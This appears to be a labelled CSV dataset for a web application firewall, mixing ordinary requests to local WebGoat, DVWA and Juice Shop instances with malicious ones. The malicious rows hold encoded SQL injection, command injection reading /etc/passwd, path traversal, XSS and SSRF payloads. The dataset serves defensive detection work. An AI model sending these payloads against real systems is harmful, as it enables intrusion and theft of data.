timestamp,app,method,url,path,query,post_data,label
2026-03-10T04:26:24.259064,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:02.544860+00:00,juiceshop,GET,http://localhost:3000/api/Quantitys/?host=127.0.0.1%3B+sleep+5,/api/Quantitys/,host=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T05:00:46.449294,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:00.360860+00:00,juiceshop,POST,http://localhost:3000/login,/login,,token=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T04:43:55.476057,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:01.873860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/service/hint.mvc,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-03-10T05:01:31.451780,juiceshop,GET,http://localhost:3000/assets/public/images/products/permafrost.jpg,/assets/public/images/products/permafrost.jpg,,,benign
2026-04-20T15:00:00.058860+00:00,juiceshop,GET,http://localhost:3000/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/view,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.926860+00:00,dvwa,POST,http://localhost:8081/feedback,/feedback,,email=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-03-10T04:21:22.812162,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:57:25.216344,webgoat,GET,https://www.youtube.com/s/player/44899b31/player_es6.vflset/en_GB/remote.js,https://www.youtube.com/s/player/44899b31/player_es6.vflset/en_GB/remote.js,,,benign
2026-04-20T15:00:02.482860+00:00,juiceshop,GET,http://localhost:3000/view?path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/view,path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T04:52:56.679914,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=JWT&index=1,/service/hint.mvc,lessonName=JWT&index=1,,benign
2026-04-20T15:00:04.865860+00:00,dvwa,POST,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,url=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T04:43:51.382631,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:00.066860+00:00,juiceshop,POST,http://localhost:3000/api/login,/api/login,,token=%27+OR+%271%27%3D%271%27+--+,malicious
2026-03-10T04:22:35.872847,juiceshop,GET,http://localhost:3000/assets/public/images/products/eggfruit_juice.jpg,/assets/public/images/products/eggfruit_juice.jpg,,,benign
2026-03-10T05:05:54.540825,juiceshop,GET,http://localhost:3000/api/Quantitys/,/api/Quantitys/,,,benign
2026-04-20T15:00:00.741860+00:00,webgoat,GET,http://localhost:8082/service/lessoninfo.mvc/HttpProxies.lesson?target=http%3A%2F%2Flocalhost%2Fadmin,/service/lessoninfo.mvc/HttpProxies.lesson,target=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-04-20T15:00:01.849860+00:00,juiceshop,POST,http://localhost:3000/rest/captcha/,/rest/captcha/,,username=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-03-10T05:02:24.835065,juiceshop,GET,http://localhost:3000/rest/basket/12,/rest/basket/12,,,benign
2026-04-20T15:00:03.936860+00:00,webgoat,POST,http://localhost:8082/service/hint.mvc,/service/hint.mvc,,message=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:04.711860+00:00,juiceshop,POST,http://localhost:3000/feedback,/feedback,,token=%3Csvg%2Fonload%3Dalert%281%29%3E,malicious
2026-03-10T05:04:26.630351,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:11:41.191103,webgoat,GET,http://localhost:8082/WebGoat/js/libs/polyglot.min.js,/js/libs/polyglot.min.js,,,benign
2026-03-10T04:47:02.423970,juiceshop,GET,http://localhost:3000/assets/public/images/products/permafrost.jpg,/assets/public/images/products/permafrost.jpg,,,benign
2026-03-10T05:07:05.027466,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/HintModel.js,/js/goatApp/model/HintModel.js,,,benign
2026-04-20T15:00:00.566860+00:00,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration?host=%27+OR+SLEEP%285%29--,/rest/admin/application-configuration,host=%27+OR+SLEEP%285%29--,,malicious
2026-04-20T15:00:03.801860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?page=1%27+AND+%271%27%3D%271,/dvwa/images/logo.png,page=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T04:26:29.632198,webgoat,GET,http://localhost:8082/WebGoat/css/main.css,/css/main.css,,,benign
2026-03-10T04:51:47.269170,webgoat,GET,http://localhost:8082/WebGoat/js/search.js,/js/search.js,,,benign
2026-04-20T15:00:01.705860+00:00,juiceshop,GET,http://localhost:3000/view?path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/view,path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-03-10T04:22:06.814995,juiceshop,GET,http://localhost:3000/assets/public/images/products/green_smoothie.jpg,/assets/public/images/products/green_smoothie.jpg,,,benign
2026-04-20T15:00:04.004860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?page=%27+UNION+SELECT+1%2C2%2C3--,/vulnerabilities/xss_r/,page=%27+UNION+SELECT+1%2C2%2C3--,,malicious
2026-04-20T15:00:04.536860+00:00,juiceshop,GET,http://localhost:3000/api/Quantitys/?template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/api/Quantitys/,template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-03-10T04:22:27.819410,juiceshop,GET,http://localhost:3000/rest/order-history,/rest/order-history,,,benign
2026-04-20T15:00:04.422860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?cmd=localhost%3B+uname+-a,/dvwa/images/logo.png,cmd=localhost%3B+uname+-a,,malicious
2026-03-10T05:04:37.467226,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:24:12.480707,dvwa,GET,http://localhost:8081/,/,,,benign
2026-03-10T05:04:23.722774,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:00.884860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/eggfruit_juice.jpg?host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/assets/public/images/products/eggfruit_juice.jpg,host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T04:58:11.999418,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=JWT&index=2,/service/hint.mvc,lessonName=JWT&index=2,,benign
2026-03-10T04:50:58.490717,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-04-20T15:00:02.569860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/support/GoatUtils.js?page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/js/goatApp/support/GoatUtils.js,page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:00.602860+00:00,webgoat,GET,http://localhost:8082/lesson_js/feedback.js?search=%27+OR+SLEEP%285%29--,/lesson_js/feedback.js,search=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T04:22:24.830464,juiceshop,GET,http://localhost:3000/api/Quantitys/,/api/Quantitys/,,,benign
2026-03-10T04:43:51.241197,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:04.274860+00:00,juiceshop,GET,http://localhost:3000/rest/products/25/reviews?page=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/rest/products/25/reviews,page=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:02.835860+00:00,dvwa,GET,http://localhost:8081/download?page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/download,page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T05:04:36.416886,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:04.247860+00:00,webgoat,POST,http://localhost:8082/js/libs/text.js,/js/libs/text.js,,message=admin%27+--,malicious
2026-03-10T04:49:13.147489,dvwa,GET,http://localhost:8081/vulnerabilities/sqli_blind/?id=33&Submit=Submit,/vulnerabilities/sqli_blind/,id=33&Submit=Submit,,benign
2026-03-10T04:43:54.543720,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:01:04.205344,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:47:32.175117,webgoat,GET,http://localhost:8082/WebGoat/lesson_js/jwt-refresh.js,/lesson_js/jwt-refresh.js,,,benign
2026-04-20T15:00:02.088860+00:00,dvwa,GET,http://localhost:8081/proxy?target=http%3A%2F%2F127.0.0.1%3A22,/proxy,target=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:00.922860+00:00,dvwa,POST,http://localhost:8081/submit,/submit,,email=1+OR+1%3D1--,malicious
2026-03-10T05:08:49.853129,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.612860+00:00,juiceshop,POST,http://localhost:3000/api/login,/api/login,,message=1%27+AND+%271%27%3D%271,malicious
2026-03-10T05:06:53.012955,juiceshop,GET,http://localhost:3000/main.js,/main.js,,,benign
2026-03-10T05:04:14.188758,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:03:41.053418,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=CSRF&index=1,/service/hint.mvc,lessonName=CSRF&index=1,,benign
2026-04-20T15:00:04.486860+00:00,dvwa,POST,http://localhost:8081/api/review,/api/review,,username=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:02.576860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/model/LessonContentModel.js?target=127.0.0.1+%26%26+whoami,/js/goatApp/model/LessonContentModel.js,target=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:01.684860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/view/MenuButtonView.js?page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/js/goatApp/view/MenuButtonView.js,page=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:04.670860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?target=127.0.0.1%3B+sleep+5,/dvwa/images/logo.png,target=127.0.0.1%3B+sleep+5,,malicious
2026-04-20T15:00:03.662860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/model/LessonContentModel.js?target=localhost%3B+uname+-a,/js/goatApp/model/LessonContentModel.js,target=localhost%3B+uname+-a,,malicious
2026-03-10T05:06:53.517396,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T05:01:07.474510,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,,benign
2026-04-20T15:00:03.271860+00:00,dvwa,POST,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,email=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:01.163860+00:00,juiceshop,GET,http://localhost:3000/rest/products/33/reviews?user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/rest/products/33/reviews,user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T04:46:04.463091,juiceshop,POST,http://localhost:3000/api/Users/,/api/Users/,,"{""email"":""user_289fbd62@waf-test.com"",""password"":""Test@12345!"",""passwordRepeat"":""Test@12345!"",""securityQuestion"":{""id"":1,""question"":""Your eldest siblings middle name?"",""createdAt"":""2026-03-10T04:03:05.064Z"",""updatedAt"":""2026-03-10T04:03:05.064Z""},""securityAnswer"":""waftest""}",benign
2026-03-10T04:25:26.593481,juiceshop,GET,http://localhost:3000/assets/public/images/products/artwork2.jpg,/assets/public/images/products/artwork2.jpg,,,benign
2026-03-10T04:53:39.745934,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:50:03.648474,dvwa,GET,http://localhost:8081/vulnerabilities/open_redirect/?redirect=info.php,/vulnerabilities/open_redirect/,redirect=info.php,,benign
2026-03-10T05:04:16.346835,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:47:12.190787,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/HintCollection.js,/js/goatApp/model/HintCollection.js,,,benign
2026-03-10T04:52:06.978217,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/JWT,/service/lessonoverview.mvc/JWT,,,benign
2026-03-10T05:08:35.858351,webgoat,GET,http://localhost:8082/WebGoat/js/libs/jquery-2.1.4.min.js,/js/libs/jquery-2.1.4.min.js,,,benign
2026-03-10T04:18:27.676712,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?name=Alice,/vulnerabilities/xss_r/,name=Alice,,benign
2026-03-10T05:04:46.377882,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:57:53.859206,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=GeneralHeader&index=3,/service/hint.mvc,lessonName=GeneralHeader&index=3,,benign
2026-03-10T05:09:02.894349,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T05:01:22.465240,juiceshop,GET,http://localhost:3000/socket.io/?EIO=4&transport=polling&t=PpM7mAS&sid=R0tzFDJzI0Gl_yonAAAm,/socket.io/,EIO=4&transport=polling&t=PpM7mAS&sid=R0tzFDJzI0Gl_yonAAAm,,benign
2026-04-20T15:00:03.753860+00:00,dvwa,GET,http://localhost:8081/download?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/download,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:00.835860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,password=admin%27+--,malicious
2026-03-10T04:53:23.934705,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:46:14.199584,juiceshop,GET,http://localhost:3000/rest/user/whoami,/rest/user/whoami,,,benign
2026-03-10T05:08:35.837315,webgoat,GET,http://localhost:8082/WebGoat/css/img/delang.svg,/css/img/delang.svg,,,benign
2026-04-20T15:00:00.300860+00:00,dvwa,POST,http://localhost:8081/feedback,/feedback,,message=%3Csvg%2Fonload%3Dalert%281%29%3E,malicious
2026-04-20T15:00:04.856860+00:00,dvwa,POST,http://localhost:8081/dvwa/images/login_logo.png,/dvwa/images/login_logo.png,,comment=1%27+AND+%271%27%3D%271,malicious
2026-03-10T04:21:45.384106,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:03.224860+00:00,webgoat,GET,http://localhost:8082/start?dest=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/start,dest=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-04-20T15:00:03.783860+00:00,dvwa,POST,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,email=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:00.035860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,comment=admin%27+--,malicious
2026-03-10T04:58:35.223820,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-03-10T05:08:42.921915,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:04.441860+00:00,webgoat,GET,http://localhost:8082/webhook/test?target=http%3A%2F%2F127.0.0.1%3A22,/webhook/test,target=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:01.839860+00:00,dvwa,POST,http://localhost:8081/login,/login,,url=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-04-20T15:00:03.278860+00:00,juiceshop,POST,http://localhost:3000/submit,/submit,,token=admin%27+--,malicious
2026-03-10T04:18:07.739598,dvwa,POST,http://localhost:8081/security.php,/security.php,,security=low&seclev_submit=Submit&user_token=56299f4ca1c276a8780066f42f27f5b8,benign
2026-04-20T15:00:01.425860+00:00,juiceshop,GET,http://localhost:3000/view?file=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/view,file=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-04-20T15:00:02.226860+00:00,juiceshop,GET,http://localhost:3000/rest/products/search?user=1+OR+1%3D1--,/rest/products/search,user=1+OR+1%3D1--,,malicious
2026-03-10T05:06:08.519382,juiceshop,GET,http://localhost:3000/rest/products/24/reviews,/rest/products/24/reviews,,,benign
2026-04-20T15:00:01.841860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/dvwa/images/logo.png,ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:02.264860+00:00,webgoat,GET,http://localhost:8082/https://yt3.ggpht.com/ytc/AIdro_kYBbPgRmHMmsfjnLW2l8Ts79gt_LMRM4enaGN7YsrvBA=s68-c-k-c0x00ffffff-no-rj?host=127.0.0.1+%26%26+whoami,/https://yt3.ggpht.com/ytc/AIdro_kYBbPgRmHMmsfjnLW2l8Ts79gt_LMRM4enaGN7YsrvBA=s68-c-k-c0x00ffffff-no-rj,host=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:00.933860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/controller/MenuController.js?host=1%27+AND+%271%27%3D%271,/js/goatApp/controller/MenuController.js,host=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T04:45:15.522641,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:09:15.102724,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:11:04.243141,juiceshop,GET,http://localhost:3000/api/Products?sort=updatedAt&order=DESC&limit=5,/api/Products,sort=updatedAt&order=DESC&limit=5,,benign
2026-04-20T15:00:04.681860+00:00,juiceshop,GET,http://localhost:3000/vendor.js?ip=127.0.0.1+%26%26+whoami,/vendor.js,ip=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:04.363860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/sqli_blind/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/vulnerabilities/sqli_blind/,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T04:48:50.754666,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:02.426860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/dvwa/js/add_event_listeners.js,host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:00.533860+00:00,dvwa,POST,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,token=%27+OR+%271%27%3D%271%27+--+,malicious
2026-04-20T15:00:05.013860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?target=localhost%3B+uname+-a,/dvwa/js/dvwaPage.js,target=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:03.703860+00:00,webgoat,GET,http://localhost:8082/https://www.gstatic.com/eureka/clank/145/cast_sender.js?id=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/https://www.gstatic.com/eureka/clank/145/cast_sender.js,id=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:03.625860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?page=%27+OR+SLEEP%285%29--,/service/hint.mvc,page=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T04:57:09.581844,webgoat,GET,http://localhost:8082/WebGoat/service/lessoninfo.mvc/HttpProxies.lesson,/service/lessoninfo.mvc/HttpProxies.lesson,,,benign
2026-03-10T04:24:33.160246,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?name=Bob,/vulnerabilities/xss_r/,name=Bob,,benign
2026-03-10T04:24:24.512082,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:04.830860+00:00,juiceshop,GET,http://localhost:3000/socket.io/?page=admin%27+--,/socket.io/,page=admin%27+--,,malicious
2026-03-10T05:11:42.137587,webgoat,GET,http://localhost:8082/WebGoat/fonts/fontawesome-webfont.woff?v=4.0.3,/fonts/fontawesome-webfont.woff,v=4.0.3,,benign
2026-03-10T04:26:55.810155,webgoat,GET,http://localhost:8082/WebGoat/lessons/XXE,/lessons/XXE,,,benign
2026-04-20T15:00:01.424860+00:00,juiceshop,POST,http://localhost:3000/vendor.js,/vendor.js,,password=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:00.189860+00:00,webgoat,GET,http://localhost:8082/images/wolf-enabled.png?ip=127.0.0.1+%26%26+whoami,/images/wolf-enabled.png,ip=127.0.0.1+%26%26+whoami,,malicious
2026-03-10T04:24:28.124749,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:23:39.548999,webgoat,GET,http://localhost:8082/WebGoat/fonts/fontawesome-webfont.woff?v=4.0.3,/fonts/fontawesome-webfont.woff,v=4.0.3,,benign
2026-03-10T04:46:00.565883,juiceshop,GET,http://localhost:3000/assets/public/images/products/lemon_juice.jpg,/assets/public/images/products/lemon_juice.jpg,,,benign
2026-03-10T04:57:04.526442,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/HintView.js,/js/goatApp/view/HintView.js,,,benign
2026-03-10T05:02:38.157338,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/HttpBasics,/service/lessonoverview.mvc/HttpBasics,,,benign
2026-04-20T15:00:03.476860+00:00,webgoat,POST,http://localhost:8082/api/review,/api/review,,email=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T04:58:19.076639,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=XXE&index=3,/service/hint.mvc,lessonName=XXE&index=3,,benign
2026-04-20T15:00:00.816860+00:00,juiceshop,GET,http://localhost:3000/rest/languages?host=1%27+AND+%271%27%3D%271,/rest/languages,host=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T05:01:01.974751,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.979860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/JuiceShop_Logo.png?url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/assets/public/images/JuiceShop_Logo.png,url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
